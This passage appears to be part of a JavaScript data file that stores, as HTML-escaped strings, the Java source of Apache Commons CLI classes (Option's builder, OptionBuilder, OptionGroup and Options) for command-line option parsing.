		        else if (hasArg())
		        {
		            buf.append(" [ARG]");
		        }

		        buf.append(" :: ").append(description);

		        if (type != null)
		        {
		            buf.append(" :: ").append(type);
		        }

		        buf.append(" ]");

		        return buf.toString();
		    }

		    /**
		     * Returns whether this Option has any values.
		     *
		     * @return whether this Option has any values.
		     */
		    private boolean hasNoValues()
		    {
		        return values.isEmpty();
		    }

		    @Override
		    public boolean equals(Object o)
		    {
		        if (this == o)
		        {
		            return true;
		        }
		        if (o == null || getClass() != o.getClass())
		        {
		            return false;
		        }

		        Option option = (Option) o;


		        if (opt != null ? !opt.equals(option.opt) : option.opt != null)
		        {
		            return false;
		        }
		        if (longOpt != null ? !longOpt.equals(option.longOpt) : option.longOpt != null)
		        {
		            return false;
		        }

		        return true;
		    }

		    @Override
		    public int hashCode()
		    {
		        int result;
		        result = opt != null ? opt.hashCode() : 0;
		        result = 31 * result + (longOpt != null ? longOpt.hashCode() : 0);
		        return result;
		    }

		    /**
		     * A rather odd clone method - due to incorrect code in 1.0 it is public 
		     * and in 1.1 rather than throwing a CloneNotSupportedException it throws 
		     * a RuntimeException so as to maintain backwards compat at the API level. 
		     *
		     * After calling this method, it is very likely you will want to call 
		     * clearValues(). 
		     *
		     * @return a clone of this Option instance
		     * @throws RuntimeException if a {@link CloneNotSupportedException} has been thrown
		     * by {@code super.clone()}
		     */
		    @Override
		    public Object clone()
		    {
		        try
		        {
		            Option option = (Option) super.clone();
		            option.values = new ArrayList&ltString&gt(values);
		            return option;
		        }
		        catch (CloneNotSupportedException cnse)
		        {
		            throw new RuntimeException("A CloneNotSupportedException was thrown: " + cnse.getMessage());
		        }
		    }

		    /**
		     * Clear the Option values. After a parse is complete, these are left with
		     * data in them and they need clearing if another parse is done.
		     *
		     * See: &lta href="https://issues.apache.org/jira/browse/CLI-71"&gtCLI-71&lt/a&gt
		     */
		    void clearValues()
		    {
		        values.clear();
		    }

		    /**
		     * This method is not intended to be used. It was a piece of internal 
		     * API that was made public in 1.0. It currently throws an UnsupportedOperationException.
		     *
		     * @param value the value to add
		     * @return always throws an {@link UnsupportedOperationException}
		     * @throws UnsupportedOperationException always
		     * @deprecated
		     */
		    @Deprecated
		    public boolean addValue(String value)
		    {
		        throw new UnsupportedOperationException("The addValue method is not intended for client use. "
		                + "Subclasses should use the addValueForProcessing method instead. ");
		    }

		    /**
		     * Tells if the option can accept more arguments.
		     * 
		     * @return false if the maximum number of arguments is reached
		     * @since 1.3
		     */
		    boolean acceptsArg()
		    {
		        return (hasArg() || hasArgs() || hasOptionalArg()) && (numberOfArgs &lt= 0 || values.size() &lt numberOfArgs);
		    }

		    /**
		     * Tells if the option requires more arguments to be valid.
		     * 
		     * @return false if the option doesn't require more arguments
		     * @since 1.3
		     */
		    boolean requiresArg()
		    {
		        if (optionalArg)
		        {
		            return false;
		        }
		        if (numberOfArgs == UNLIMITED_VALUES)
		        {
		            return values.isEmpty();
		        }
		        return acceptsArg();
		    }
		    
		    /**
		     * Returns a {@link Builder} to create an {@link Option} using descriptive
		     * methods.  
		     * 
		     * @return a new {@link Builder} instance
		     * @since 1.3
		     */
		    public static Builder builder()
		    {
		        return builder(null);
		    }
		    
		    /**
		     * Returns a {@link Builder} to create an {@link Option} using descriptive
		     * methods.  
		     *
		     * @param opt short representation of the option
		     * @return a new {@link Builder} instance
		     * @throws IllegalArgumentException if there are any non valid Option characters in {@code opt}
		     * @since 1.3
		     */
		    public static Builder builder(final String opt)
		    {
		        return new Builder(opt);
		    }
		    
		    /**
		     * A nested builder class to create &ltcode&gtOption&lt/code&gt instances
		     * using descriptive methods.
		     * &ltp&gt
		     * Example usage:
		     * &ltpre&gt
		     * Option option = Option.builder("a")
		     *     .required(true)
		     *     .longOpt("arg-name")
		     *     .build();
		     * &lt/pre&gt
		     * 
		     * @since 1.3
		     */
		    public static final class Builder 
		    {
		        /** the name of the option */
		        private final String opt;

		        /** description of the option */
		        private String description;

		        /** the long representation of the option */
		        private String longOpt;

		        /** the name of the argument for this option */
		        private String argName;

		        /** specifies whether this option is required to be present */
		        private boolean required;

		        /** specifies whether the argument value of this Option is optional */
		        private boolean optionalArg;

		        /** the number of argument values this option can have */
		        private int numberOfArgs = UNINITIALIZED;

		        /** the type of this Option */
		        private Class&lt?&gt type = String.class;

		        /** the character that is the value separator */
		        private char valuesep;

		        /**
		         * Constructs a new &ltcode&gtBuilder&lt/code&gt with the minimum
		         * required parameters for an &ltcode&gtOption&lt/code&gt instance.
		         * 
		         * @param opt short representation of the option
		         * @throws IllegalArgumentException if there are any non valid Option characters in {@code opt}
		         */
		        private Builder(final String opt) throws IllegalArgumentException
		        {
		            OptionValidator.validateOption(opt);
		            this.opt = opt;
		        }
		        
		        /**
		         * Sets the display name for the argument value.
		         *
		         * @param argName the display name for the argument value.
		         * @return this builder, to allow method chaining
		         */
		        public Builder argName(final String argName)
		        {
		            this.argName = argName;
		            return this;
		        }

		        /**
		         * Sets the description for this option.
		         *
		         * @param description the description of the option.
		         * @return this builder, to allow method chaining
		         */
		        public Builder desc(final String description)
		        {
		            this.description = description;
		            return this;
		        }

		        /**
		         * Sets the long name of the Option.
		         *
		         * @param longOpt the long name of the Option
		         * @return this builder, to allow method chaining
		         */        
		        public Builder longOpt(final String longOpt)
		        {
		            this.longOpt = longOpt;
		            return this;
		        }
		        
		        /** 
		         * Sets the number of argument values the Option can take.
		         *
		         * @param numberOfArgs the number of argument values
		         * @return this builder, to allow method chaining
		         */        
		        public Builder numberOfArgs(final int numberOfArgs)
		        {
		            this.numberOfArgs = numberOfArgs;
		            return this;
		        }
		        
		        /**
		         * Sets whether the Option can have an optional argument.
		         *
		         * @param isOptional specifies whether the Option can have
		         * an optional argument.
		         * @return this builder, to allow method chaining
		         */
		        public Builder optionalArg(final boolean isOptional)
		        {
		            this.optionalArg = isOptional;
		            return this;
		        }
		        
		        /**
		         * Marks this Option as required.
		         *
		         * @return this builder, to allow method chaining
		         */
		        public Builder required()
		        {
		            return required(true);
		        }

		        /**
		         * Sets whether the Option is mandatory.
		         *
		         * @param required specifies whether the Option is mandatory
		         * @return this builder, to allow method chaining
		         */
		        public Builder required(final boolean required)
		        {
		            this.required = required;
		            return this;
		        }
		        
		        /**
		         * Sets the type of the Option.
		         *
		         * @param type the type of the Option
		         * @return this builder, to allow method chaining
		         */
		        public Builder type(final Class&lt?&gt type)
		        {
		            this.type = type;
		            return this;
		        }

		        /**
		         * The Option will use '=' as a means to separate argument value.
		         *
		         * @return this builder, to allow method chaining
		         */
		        public Builder valueSeparator()
		        {
		            return valueSeparator('=');
		        }

		        /**
		         * The Option will use &ltcode&gtsep&lt/code&gt as a means to
		         * separate argument values.
		         * &ltp&gt
		         * &ltb&gtExample:&lt/b&gt
		         * &ltpre&gt
		         * Option opt = Option.builder("D").hasArgs()
		         *                                 .valueSeparator('=')
		         *                                 .build();
		         * Options options = new Options();
		         * options.addOption(opt);
		         * String[] args = {"-Dkey=value"};
		         * CommandLineParser parser = new DefaultParser();
		         * CommandLine line = parser.parse(options, args);
		         * String propertyName = line.getOptionValues("D")[0];  // will be "key"
		         * String propertyValue = line.getOptionValues("D")[1]; // will be "value"
		         * &lt/pre&gt
		         *
		         * @param sep The value separator.
		         * @return this builder, to allow method chaining
		         */
		        public Builder valueSeparator(final char sep)
		        {
		            valuesep = sep;
		            return this;
		        }
		        
		        /**
		         * Indicates that the Option will require an argument.
		         * 
		         * @return this builder, to allow method chaining
		         */
		        public Builder hasArg()
		        {
		            return hasArg(true);
		        }

		        /**
		         * Indicates if the Option has an argument or not.
		         * 
		         * @param hasArg specifies whether the Option takes an argument or not
		         * @return this builder, to allow method chaining
		         */
		        public Builder hasArg(final boolean hasArg)
		        {
		            // set to UNINITIALIZED when no arg is specified to be compatible with OptionBuilder
		            numberOfArgs = hasArg ? 1 : Option.UNINITIALIZED;
		            return this;
		        }

		        /**
		         * Indicates that the Option can have unlimited argument values.
		         * 
		         * @return this builder, to allow method chaining
		         */
		        public Builder hasArgs()
		        {
		            numberOfArgs = Option.UNLIMITED_VALUES;
		            return this;
		        }

		        /**
		         * Constructs an Option with the values declared by this {@link Builder}.
		         * 
		         * @return the new {@link Option}
		         * @throws IllegalArgumentException if neither {@code opt} or {@code longOpt} has been set
		         */
		        public Option build()
		        {
		            if (opt == null && longOpt == null)
		            {
		                throw new IllegalArgumentException("Either opt or longOpt must be specified");
		            }
		            return new Option(this);
		        }
		    }
		}`
	},
	ai21: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		/**
		 * OptionBuilder allows the user to create Options using descriptive methods.
		 * &ltp&gt
		 * Details on the Builder pattern can be found at
		 * &lta href="http://c2.com/cgi-bin/wiki?BuilderPattern"&gthttp://c2.com/cgi-bin/wiki?BuilderPattern&lt/a&gt.
		 * &ltp&gt
		 * This class is NOT thread safe. See &lta href="https://issues.apache.org/jira/browse/CLI-209"&gtCLI-209&lt/a&gt
		 * 
		 * @version $Id: OptionBuilder.java 1677400 2015-05-03 13:46:08Z britter $
		 * @since 1.0
		 * @deprecated since 1.3, use {@link Option#builder(String)} instead
		 */
		@Deprecated
		public final class OptionBuilder
		{
		    /** long option */
		    private static String longopt;

		    /** option description */
		    private static String description;

		    /** argument name */
		    private static String argName;

		    /** is required? */
		    private static boolean required;

		    /** the number of arguments */
		    private static int numberOfArgs = Option.UNINITIALIZED;

		    /** option type */
		    private static Class&lt?&gt type;

		    /** option can have an optional argument value */
		    private static boolean optionalArg;

		    /** value separator for argument value */
		    private static char valuesep;

		    /** option builder instance */
		    private static final OptionBuilder INSTANCE = new OptionBuilder();

		    static
		    {
		        // ensure the consistency of the initial values
		        reset();
		    }

		    /**
		     * private constructor to prevent instances being created
		     */
		    private OptionBuilder()
		    {
		        // hide the constructor
		    }

		    /**
		     * Resets the member variables to their default values.
		     */
		    private static void reset()
		    {
		        description = null;
		        argName = null;
		        longopt = null;
		        type = String.class;
		        required = false;
		        numberOfArgs = Option.UNINITIALIZED;
		        optionalArg = false;
		        valuesep = (char) 0;
		    }

		    /**
		     * The next Option created will have the following long option value.
		     *
		     * @param newLongopt the long option value
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder withLongOpt(String newLongopt)
		    {
		        OptionBuilder.longopt = newLongopt;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will require an argument value.
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasArg()
		    {
		        OptionBuilder.numberOfArgs = 1;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will require an argument value if
		     * &ltcode&gthasArg&lt/code&gt is true.
		     *
		     * @param hasArg if true then the Option has an argument value
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasArg(boolean hasArg)
		    {
		        OptionBuilder.numberOfArgs = hasArg ? 1 : Option.UNINITIALIZED;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will have the specified argument value name.
		     *
		     * @param name the name for the argument value
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder withArgName(String name)
		    {
		        OptionBuilder.argName = name;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will be required.
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder isRequired()
		    {
		        OptionBuilder.required = true;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created uses &ltcode&gtsep&lt/code&gt as a means to
		     * separate argument values.
		     * &ltp&gt
		     * &ltb&gtExample:&lt/b&gt
		     * &ltpre&gt
		     * Option opt = OptionBuilder.withValueSeparator('=')
		     *                           .create('D');
		     *
		     * String args = "-Dkey=value";
		     * CommandLine line = parser.parse(args);
		     * String propertyName = opt.getValue(0);  // will be "key"
		     * String propertyValue = opt.getValue(1); // will be "value"
		     * &lt/pre&gt
		     *
		     * @param sep The value separator to be used for the argument values.
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder withValueSeparator(char sep)
		    {
		        OptionBuilder.valuesep = sep;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created uses '&ltcode&gt=&lt/code&gt' as a means to
		     * separate argument values.
		     *
		     * &ltb&gtExample:&lt/b&gt
		     * &ltpre&gt
		     * Option opt = OptionBuilder.withValueSeparator()
		     *                           .create('D');
		     *
		     * CommandLine line = parser.parse(args);
		     * String propertyName = opt.getValue(0);
		     * String propertyValue = opt.getValue(1);
		     * &lt/pre&gt
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder withValueSeparator()
		    {
		        OptionBuilder.valuesep = '=';

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will be required if &ltcode&gtrequired&lt/code&gt
		     * is true.
		     *
		     * @param newRequired if true then the Option is required
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder isRequired(boolean newRequired)
		    {
		        OptionBuilder.required = newRequired;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created can have unlimited argument values.
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasArgs()
		    {
		        OptionBuilder.numberOfArgs = Option.UNLIMITED_VALUES;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created can have &ltcode&gtnum&lt/code&gt argument values.
		     *
		     * @param num the number of args that the option can have
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasArgs(int num)
		    {
		        OptionBuilder.numberOfArgs = num;

		        return INSTANCE;
		    }

		    /**
		     * The next Option can have an optional argument.
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasOptionalArg()
		    {
		        OptionBuilder.numberOfArgs = 1;
		        OptionBuilder.optionalArg = true;

		        return INSTANCE;
		    }

		    /**
		     * The next Option can have an unlimited number of optional arguments.
		     *
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasOptionalArgs()
		    {
		        OptionBuilder.numberOfArgs = Option.UNLIMITED_VALUES;
		        OptionBuilder.optionalArg = true;

		        return INSTANCE;
		    }

		    /**
		     * The next Option can have the specified number of optional arguments.
		     *
		     * @param numArgs - the maximum number of optional arguments
		     * the next Option created can have.
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder hasOptionalArgs(int numArgs)
		    {
		        OptionBuilder.numberOfArgs = numArgs;
		        OptionBuilder.optionalArg = true;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will have a value that will be an instance
		     * of &ltcode&gttype&lt/code&gt.
		     * &ltp&gt
		     * &ltb&gtNote:&lt/b&gt this method is kept for binary compatibility and the
		     * input type is supposed to be a {@link Class} object. 
		     *
		     * @param newType the type of the Options argument value
		     * @return the OptionBuilder instance
		     * @deprecated since 1.3, use {@link #withType(Class)} instead
		     */
		    @Deprecated
		    public static OptionBuilder withType(Object newType)
		    {
		        return withType((Class&lt?&gt) newType);
		    }

		    /**
		     * The next Option created will have a value that will be an instance
		     * of &ltcode&gttype&lt/code&gt.
		     *
		     * @param newType the type of the Options argument value
		     * @return the OptionBuilder instance
		     * @since 1.3
		     */
		    public static OptionBuilder withType(Class&lt?&gt newType)
		    {
		        OptionBuilder.type = newType;

		        return INSTANCE;
		    }

		    /**
		     * The next Option created will have the specified description
		     *
		     * @param newDescription a description of the Option's purpose
		     * @return the OptionBuilder instance
		     */
		    public static OptionBuilder withDescription(String newDescription)
		    {
		        OptionBuilder.description = newDescription;

		        return INSTANCE;
		    }

		    /**
		     * Create an Option using the current settings and with
		     * the specified Option &ltcode&gtchar&lt/code&gt.
		     *
		     * @param opt the character representation of the Option
		     * @return the Option instance
		     * @throws IllegalArgumentException if &ltcode&gtopt&lt/code&gt is not
		     * a valid character.  See Option.
		     */
		    public static Option create(char opt) throws IllegalArgumentException
		    {
		        return create(String.valueOf(opt));
		    }

		    /**
		     * Create an Option using the current settings
		     *
		     * @return the Option instance
		     * @throws IllegalArgumentException if &ltcode&gtlongOpt&lt/code&gt has not been set.
		     */
		    public static Option create() throws IllegalArgumentException
		    {
		        if (longopt == null)
		        {
		            OptionBuilder.reset();
		            throw new IllegalArgumentException("must specify longopt");
		        }

		        return create(null);
		    }

		    /**
		     * Create an Option using the current settings and with
		     * the specified Option &ltcode&gtchar&lt/code&gt.
		     *
		     * @param opt the &ltcode&gtjava.lang.String&lt/code&gt representation
		     * of the Option
		     * @return the Option instance
		     * @throws IllegalArgumentException if &ltcode&gtopt&lt/code&gt is not
		     * a valid character.  See Option.
		     */
		    public static Option create(String opt) throws IllegalArgumentException
		    {
		        Option option = null;
		        try
		        {
		            // create the option
		            option = new Option(opt, description);

		            // set the option properties
		            option.setLongOpt(longopt);
		            option.setRequired(required);
		            option.setOptionalArg(optionalArg);
		            option.setArgs(numberOfArgs);
		            option.setType(type);
		            option.setValueSeparator(valuesep);
		            option.setArgName(argName);
		        }
		        finally
		        {
		            // reset the OptionBuilder properties
		            OptionBuilder.reset();
		        }

		        // return the Option instance
		        return option;
		    }
		}`
	},
	ai22: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.Serializable;
		import java.util.Collection;
		import java.util.Iterator;
		import java.util.LinkedHashMap;
		import java.util.Map;

		/**
		 * A group of mutually exclusive options.
		 *
		 * @version $Id: OptionGroup.java 1749596 2016-06-21 20:27:06Z britter $
		 */
		public class OptionGroup implements Serializable
		{
		    /** The serial version UID. */
		    private static final long serialVersionUID = 1L;
		    
		    /** hold the options */
		    private final Map&ltString, Option&gt optionMap = new LinkedHashMap&ltString, Option&gt();

		    /** the name of the selected option */
		    private String selected;

		    /** specified whether this group is required */
		    private boolean required;

		    /**
		     * Add the specified &ltcode&gtOption&lt/code&gt to this group.
		     *
		     * @param option the option to add to this group
		     * @return this option group with the option added
		     */
		    public OptionGroup addOption(Option option)
		    {
		        // key   - option name
		        // value - the option
		        optionMap.put(option.getKey(), option);

		        return this;
		    }

		    /**
		     * @return the names of the options in this group as a 
		     * &ltcode&gtCollection&lt/code&gt
		     */
		    public Collection&ltString&gt getNames()
		    {
		        // the key set is the collection of names
		        return optionMap.keySet();
		    }

		    /**
		     * @return the options in this group as a &ltcode&gtCollection&lt/code&gt
		     */
		    public Collection&ltOption&gt getOptions()
		    {
		        // the values are the collection of options
		        return optionMap.values();
		    }

		    /**
		     * Set the selected option of this group to &ltcode&gtname&lt/code&gt.
		     *
		     * @param option the option that is selected
		     * @throws AlreadySelectedException if an option from this group has 
		     * already been selected.
		     */
		    public void setSelected(Option option) throws AlreadySelectedException
		    {
		        if (option == null)
		        {
		            // reset the option previously selected
		            selected = null;
		            return;
		        }
		        
		        // if no option has already been selected or the 
		        // same option is being reselected then set the
		        // selected member variable
		        if (selected == null || selected.equals(option.getKey()))
		        {
		            selected = option.getKey();
		        }
		        else
		        {
		            throw new AlreadySelectedException(this, option);
		        }
		    }

		    /**
		     * @return the selected option name
		     */
		    public String getSelected()
		    {
		        return selected;
		    }

		    /**
		     * @param required specifies if this group is required
		     */
		    public void setRequired(boolean required)
		    {
		        this.required = required;
		    }

		    /**
		     * Returns whether this option group is required.
		     *
		     * @return whether this option group is required
		     */
		    public boolean isRequired()
		    {
		        return required;
		    }

		    /**
		     * Returns the stringified version of this OptionGroup.
		     * 
		     * @return the stringified representation of this group
		     */
		    @Override
		    public String toString()
		    {
		        StringBuilder buff = new StringBuilder();
		        
		        Iterator&ltOption&gt iter = getOptions().iterator();

		        buff.append("[");

		        while (iter.hasNext())
		        {
		            Option option = iter.next();

		            if (option.getOpt() != null)
		            {
		                buff.append("-");
		                buff.append(option.getOpt());
		            }
		            else
		            {
		                buff.append("--");
		                buff.append(option.getLongOpt());
		            }
		            
		            if (option.getDescription() != null)
		            {
		                buff.append(" ");
		                buff.append(option.getDescription());
		            }
		            
		            if (iter.hasNext())
		            {
		                buff.append(", ");
		            }
		        }

		        buff.append("]");

		        return buff.toString();
		    }
		}`
	},
	ai23: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
		 *     http://www.apache.org/licenses/LICENSE-2.0
		 *
		 * Unless required by applicable law or agreed to in writing, software
		 * distributed under the License is distributed on an "AS IS" BASIS,
		 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
		 * See the License for the specific language governing permissions and
		 * limitations under the License.
		 */

		package org.apache.commons.cli;

		import java.io.Serializable;
		import java.util.ArrayList;
		import java.util.Collection;
		import java.util.Collections;
		import java.util.HashSet;
		import java.util.LinkedHashMap;
		import java.util.List;
		import java.util.Map;

		/**
		 * Main entry-point into the library.
		 * &ltp&gt
		 * Options represents a collection of {@link Option} objects, which
		 * describe the possible options for a command-line.
		 * &ltp&gt
		 * It may flexibly parse long and short options, with or without
		 * values.  Additionally, it may parse only a portion of a commandline,
		 * allowing for flexible multi-stage parsing.
		 *
		 * @see org.apache.commons.cli.CommandLine
		 *
		 * @version $Id: Options.java 1754332 2016-07-27 18:47:57Z britter $
		 */
		public class Options implements Serializable
		{
		    /** The serial version UID. */
		    private static final long serialVersionUID = 1L;

		    /** a map of the options with the character key */
		    private final Map&ltString, Option&gt shortOpts = new LinkedHashMap&ltString, Option&gt();

		    /** a map of the options with the long key */
		    private final Map&ltString, Option&gt longOpts = new LinkedHashMap&ltString, Option&gt();

		    /** a map of the required options */
		    // N.B. This can contain either a String (addOption) or an OptionGroup (addOptionGroup)
		    // TODO this seems wrong
		    private final List&ltObject&gt requiredOpts = new ArrayList&ltObject&gt();

		    /** a map of the option groups */
		    private final Map&ltString, OptionGroup&gt optionGroups = new LinkedHashMap&ltString, OptionGroup&gt();

		    /**
		     * Add the specified option group.
		     *
		     * @param group the OptionGroup that is to be added
		     * @return the resulting Options instance
		     */
		    public Options addOptionGroup(OptionGroup group)
		    {
		        if (group.isRequired())
		        {
		            requiredOpts.add(group);
		        }

		        for (Option option : group.getOptions())
		        {
		            // an Option cannot be required if it is in an
		            // OptionGroup, either the group is required or
		            // nothing is required
		            option.setRequired(false);
		            addOption(option);

		            optionGroups.put(option.getKey(), group);
		        }

		        return this;
		    }

		    /**
		     * Lists the OptionGroups that are members of this Options instance.
		     *
		     * @return a Collection of OptionGroup instances.
		     */
		    Collection&ltOptionGroup&gt getOptionGroups()
		    {
		        return new HashSet&ltOptionGroup&gt(optionGroups.values());
		    }

		    /**
		     * Add an option that only contains a short name.
		     * 
		     * &ltp&gt
		     * The option does not take an argument.
		     * &lt/p&gt
		     *
		     * @param opt Short single-character name of the option.
		     * @param description Self-documenting description
		     * @return the resulting Options instance
		     * @since 1.3
		     */
		    public Options addOption(String opt, String description)
		    {
		        addOption(opt, null, false, description);
		        return this;
		    }

		    /**
		     * Add an option that only contains a short-name.
		     *
		     * &ltp&gt
		     * It may be specified as requiring an argument.
		     * &lt/p&gt
		     *
		     * @param opt Short single-character name of the option.
		     * @param hasArg flag signally if an argument is required after this option
		     * @param description Self-documenting description
		     * @return the resulting Options instance
		     */
		    public Options addOption(String opt, boolean hasArg, String description)
		    {
		        addOption(opt, null, hasArg, description);
		        return this;
		    }

		    /**
		     * Add an option that contains a short-name and a long-name.
		     *
		     * &ltp&gt
		     * It may be specified as requiring an argument.
		     * &lt/p&gt
		     *
		     * @param opt Short single-character name of the option.
		     * @param longOpt Long multi-character name of the option.
		     * @param hasArg flag signally if an argument is required after this option
		     * @param description Self-documenting description
		     * @return the resulting Options instance
		     */
		    public Options addOption(String opt, String longOpt, boolean hasArg, String description)
		    {
		        addOption(new Option(opt, longOpt, hasArg, description));
		        return this;
		    }

		    /**
		     * Add an option that contains a short-name and a long-name.
		     * 
		     * &ltp&gt
		     * The added option is set as required. It may be specified as requiring an argument. This method is a shortcut for:
		     * &lt/p&gt
		     *
		     * &ltpre&gt
		     * &ltcode&gt
		     * Options option = new Option(opt, longOpt, hasArg, description);
		     * option.setRequired(true);
		     * options.add(option);
		     * &lt/code&gt
		     * &lt/pre&gt
		     *
		     * @param opt Short single-character name of the option.
		     * @param longOpt Long multi-character name of the option.
		     * @param hasArg flag signally if an argument is required after this option
		     * @param description Self-documenting description
		     * @return the resulting Options instance
		     * @since 1.4
		     */
		    public Options addRequiredOption(String opt, String longOpt, boolean hasArg, String description)
		    {
		        Option option = new Option(opt, longOpt, hasArg, description);
		        option.setRequired(true);
		        addOption(option);
		        return this;
		    }

		    /**
		     * Adds an option instance
		     *
		     * @param opt the option that is to be added
		     * @return the resulting Options instance
		     */
		    public Options addOption(Option opt)
		    {
		        String key = opt.getKey();

		        // add it to the long option list
		        if (opt.hasLongOpt())
		        {
		            longOpts.put(opt.getLongOpt(), opt);
		        }

		        // if the option is required add it to the required list
		        if (opt.isRequired())
		        {
		            if (requiredOpts.contains(key))
		            {
		                requiredOpts.remove(requiredOpts.indexOf(key));
		            }
		            requiredOpts.add(key);
		        }

		        shortOpts.put(key, opt);

		        return this;
		    }

		    /**
		     * Retrieve a read-only list of options in this set
		     *
		     * @return read-only Collection of {@link Option} objects in this descriptor
		     */
		    public Collection&ltOption&gt getOptions()
		    {
		        return Collections.unmodifiableCollection(helpOptions());
		    }

		    /**
		     * Returns the Options for use by the HelpFormatter.
		     *
		     * @return the List of Options
		     */
		    List&ltOption&gt helpOptions()
		    {
		        return new ArrayList&ltOption&gt(shortOpts.values());
		    }

		    /**
		     * Returns the required options.
		     *
		     * @return read-only List of required options
		     */
		    public List getRequiredOptions()
		    {
		        return Collections.unmodifiableList(requiredOpts);
		    }

		    /**
		     * Retrieve the {@link Option} matching the long or short name specified.
		     *
		     * &ltp&gt
		     * The leading hyphens in the name are ignored (up to 2).
		     * &lt/p&gt
		     *
		     * @param opt short or long name of the {@link Option}
		     * @return the option represented by opt
		     */
		    public Option getOption(String opt)
		    {
		        opt = Util.stripLeadingHyphens(opt);

		        if (shortOpts.containsKey(opt))
		        {
		            return shortOpts.get(opt);
		        }

		        return longOpts.get(opt);
		    }

		    /**
		     * Returns the options with a long name starting with the name specified.
		     * 
		     * @param opt the partial name of the option
		     * @return the options matching the partial name specified, or an empty list if none matches
		     * @since 1.3
		     */
		    public List&ltString&gt getMatchingOptions(String opt)
		    {
		        opt = Util.stripLeadingHyphens(opt);
		        
		        List&ltString&gt matchingOpts = new ArrayList&ltString&gt();

		        // for a perfect match return the single option only
		        if (longOpts.keySet().contains(opt))
		        {
		            return Collections.singletonList(opt);
		        }

		        for (String longOpt : longOpts.keySet())
		        {
		            if (longOpt.startsWith(opt))
		            {
		                matchingOpts.add(longOpt);
		            }
		        }
		        
		        return matchingOpts;
		    }

		    /**
		     * Returns whether the named {@link Option} is a member of this {@link Options}.
		     *
		     * @param opt short or long name of the {@link Option}
		     * @return true if the named {@link Option} is a member of this {@link Options}
		     */
		    public boolean hasOption(String opt)
		    {
		        opt = Util.stripLeadingHyphens(opt);

		        return shortOpts.containsKey(opt) || longOpts.containsKey(opt);
		    }

		    /**
		     * Returns whether the named {@link Option} is a member of this {@link Options}.
		     *
		     * @param opt long name of the {@link Option}
		     * @return true if the named {@link Option} is a member of this {@link Options}
		     * @since 1.3
		     */
		    public boolean hasLongOption(String opt)
		    {
		        opt = Util.stripLeadingHyphens(opt);

		        return longOpts.containsKey(opt);
		    }

		    /**
		     * Returns whether the named {@link Option} is a member of this {@link Options}.
		     *
		     * @param opt short name of the {@link Option}
		     * @return true if the named {@link Option} is a member of this {@link Options}
		     * @since 1.3
		     */
		    public boolean hasShortOption(String opt)
		    {
		        opt = Util.stripLeadingHyphens(opt);

		        return shortOpts.containsKey(opt);
		    }

		    /**
		     * Returns the OptionGroup the &ltcode&gtopt&lt/code&gt belongs to.
		     *
		     * @param opt the option whose OptionGroup is being queried.
		     * @return the OptionGroup if &ltcode&gtopt&lt/code&gt is part of an OptionGroup, otherwise return null
		     */
		    public OptionGroup getOptionGroup(Option opt)
		    {
		        return optionGroups.get(opt.getKey());
		    }

		    /**
		     * Dump state, suitable for debugging.
		     *
		     * @return Stringified form of this object
		     */
		    @Override
		    public String toString()
		    {
		        StringBuilder buf = new StringBuilder();

		        buf.append("[ Options: [ short ");
		        buf.append(shortOpts.toString());
		        buf.append(" ] [ long ");
		        buf.append(longOpts);
		        buf.append(" ]");

		        return buf.toString();
		    }
		}`
	},
	ai24: {
		type: 'java',
		code: `
		/**
		 * Licensed to the Apache Software Foundation (ASF) under one or more
		 * contributor license agreements.  See the NOTICE file distributed with
		 * this work for additional information regarding copyright ownership.
		 * The ASF licenses this file to You under the Apache License, Version 2.0
		 * (the "License"); you may not use this file except in compliance with
		 * the License.  You may obtain a copy of the License at
		 *
